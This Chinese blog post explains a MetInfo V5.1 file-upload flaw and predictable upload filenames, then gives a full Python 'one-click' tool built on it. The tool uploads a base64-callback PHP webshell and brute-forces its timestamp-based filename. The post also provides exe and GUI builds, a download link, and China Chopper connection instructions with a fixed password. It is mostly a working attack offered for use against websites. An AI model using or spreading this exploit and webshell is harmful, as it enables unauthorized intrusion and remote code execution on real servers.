title: MetInfo V5.1 GetShell一键化工具
date: 2016-06-08 22:40:32
update: ""
author: me
tags:
- Hacker
- Tools
categories:
- Hacker
topic: ""
cover: ""
draft: false
preview: ""
top: false
type: ""
hide: false
config: null


---


----------
# 漏洞解析：
----------
**config/config.inc.php**
```php
$langoks = $db->get_one("SELECT * FROM $met_lang WHERE lang='$lang'");

if(!$langoks)die('No data in the database,please reinstall.');

if(!$langoks[useok]&&!$metinfoadminok)okinfo('../404.html');

if(count($met_langok)==1)$lang=$met_index_type;

$query = "SELECT * FROM $met_config WHERE lang='$lang' or lang='metinfo'";//看这里

$result = $db->query($query);

while($list_config= $db->fetch_array($result)){

	if($metinfoadminok)$list_config['value']=str_replace('"', '&#34;', str_replace("'", '&#39;',$list_config['value']));

	$settings_arr[]=$list_config;

	if($list_config['columnid']){

		$settings[$list_config['name'].'_'.$list_config['columnid']]=$list_config['value'];

	}else{

		$settings[$list_config['name']]=$list_config['value'];

	}

}

@extract($settings);
```
----------
<!--more-->
访问

http:///localhost/metinfo5.1/index.php?lang=metinfo

`SELECT * FROM met_config WHERE lang='metinfo' or lang='metinfo'`

----------
## 文件命名方式：
----------
**/feedback/uploadfile_save.php**
```php
srand((double)microtime() * 1000000);

$rnd = rand(100, 999);

$name = date('U') + $rnd;

$name = $name.".".$ext;

```
**文件保存在/upload/file/目录**

命名方式就是时间戳去掉后三位，紧接着一个三位数的随机数

可爆破：

如

http://127.0.0.1/upload/file/1465394396.php

----------

# 一键化利用工具：

----------

**本程序基于python编写**

```python
#!/usr/bin/env python
#-*- coding: utf-8 -*-

import requests
import Queue
import threading
import time
import sys


headers = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.10 Safari/537.36'}

urls = Queue.Queue()
#http://hb.jhxjd.com/upload/file/1441445378.php

def bp(urls,time_out):
    while not urls.empty():
        base_url = urls.get()
        response = None

        try:
            time.sleep(int(time_out))#延时设置
            response = requests.get(base_url,headers=headers)
            if response.status_code == 404:
                print 'Not Fount----%s\n' % base_url
        except:
            continue
        finally:
            if response:
                with open('url.txt','a+') as f:
                    f.write('%s?e=YXNzZXJ0\n'%base_url)

def main(target_url,thread_num,time_out):

    #取出当前时间戳并删除后四位
    now = str(int(time.time()))[:-4]

    #将所有的待爆破地址遍历并加入队列
    for i in range(0,10):
        for j in range(100,1000):
            num_str = ''.join((str(i),str(j)))
            url = ''.join(('%s/upload/file/%s' % (target_url,now),num_str,'.php'))
            urls.put(url)

    #上传文件
    with open('xiaoma.php','w+') as fi:
        fi.write("<?php $e = $_REQUEST['e'];register_shutdown_function(base64_decode($e), $_REQUEST['Akkuman']);?>")
    data = {
            'fd_para[1][para]':'filea',
            'fd_para[1][type]':'5'
            }
    files = {'filea': open("xiaoma.php", 'rb')}
    upload_url = '%s/feedback/uploadfile_save.php?met_file_format=pphphp&met_file_maxsize=9999&lang=metinfo' % target_url
    res = requests.post(upload_url,data = data,files=files)
    #等待两秒  文件上传
    time.sleep(2)




    #启动多线程
    for i in range(int(thread_num)):
        t = threading.Thread(target = bp,args=(urls,time_out,))
        t.start()


if __name__ == '__main__':
    if len(sys.argv) != 4:
        print 'Example : %s http://www.xxx.com 20 0' % sys.argv[0]
    else:
        main(sys.argv[1],sys.argv[2],sys.argv[3])

```

程序略显粗糙

为了方便，我也把他打包成了**exe**

然后闲着没事，想着简单地给他做了个**界面**,这样的
![GUI](http://7xusrl.com1.z0.glb.clouddn.com/MetInfo5.1GetshellGui.png)

----------
# 文件说明
----------
> MetInfo V5.1上传漏洞getshell利用工具

> 	作者 : Akkuman

> 漏洞原理详见http://www.wooyun.org/bugs/wooyun-2010-0139168

> 使用说明：
> 本目录有两个文件，一个py，一个exe
> 因为exe是py文件打包而成，故文件较大
> 64位系统测试使用通过
> 
> 如果你安装了py2.x环境  py文件使用方法
> 打开cmd
> python baopo.py http://www.xxx.com 20 0
> 20是线程数，0是每次请求等待时间（网站限制时可设置为2或3）可以自己指定
> 
> exe命令行文件使用方法
> 打开cmd
> baopo.exe http://www.xxx.com 20 0
> 20是线程数，0是每次请求等待时间（网站限制时可设置为2或3）可以自己指定
> 
> GUI程序，应该不用说
> 
> 关于getshell与结果
> 上传的是回调一句话木马
> ```php
> <?php >$e=$_REQUEST['e'];register_shutdown_function(base64_decode($e),$_>REQUEST['Akkuman']);?>
> ```
> 菜刀连接，密码是Akkuman
> 
> 爆破结果会生成在**url.txt**

----------
# 下载地址：
----------
[(访问码:1475)](http://cloud.189.cn/t/v263QbMJVJ3u )

*转载请注明出处*

*作者博客 hacktech.cn | 53xiaoshuo.com*
